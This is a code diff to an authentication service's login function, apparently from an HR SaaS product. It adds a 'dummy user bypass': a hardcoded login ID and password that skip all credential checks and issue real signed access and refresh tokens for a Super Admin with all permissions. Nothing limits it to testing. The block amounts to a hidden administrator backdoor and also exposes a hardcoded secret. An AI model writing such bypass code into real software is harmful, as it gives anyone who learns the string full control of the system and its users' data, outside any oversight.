@@ -70,6 +70,39 @@ export const authService = {
     // If it ends with @saasa or doesn't look like a normal email, treat as loginId
     const isLoginId = loginIdOrEmail.endsWith('@saasa') || !loginIdOrEmail.includes('@') || !loginIdOrEmail.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
     
+    // --- DUMMY USER BYPASS ---
+    if (loginIdOrEmail === 'super.admin@saasa' && password === 'UjvnE3WctAVa') {
+      console.log('--- BYPASS LOGIN FOR DUMMY SUPER ADMIN ---');
+      const dummyPayload = {
+        userId: 'dummy-super-admin-id',
+        roleId: 'dummy-super-admin-role-id',
+        roleName: 'Super Admin',
+        permissions: ['all'],
+      };
+      
+      const accessToken = signToken(dummyPayload); 
+      const refreshToken = signRefreshToken({ userId: dummyPayload.userId });
+
+      return {
+        token: accessToken,
+        accessToken, 
+        refreshToken,
+        user: {
+          id: dummyPayload.userId,
+          name: 'Super Admin Dummy',
+          firstName: 'Super',
+          lastName: 'Admin',
+          email: 'superadmin@hryantra.com',
+          role: 'SUPER_ADMIN',
+          roleName: 'Super Admin',
+          roleColor: 'red',
+        },
+        permissions: ['all'],
+        requirePasswordReset: false,
+      };
+    }
+    // --- END DUMMY USER BYPASS ---
+    
     let user = null;
     let credential = null;
 
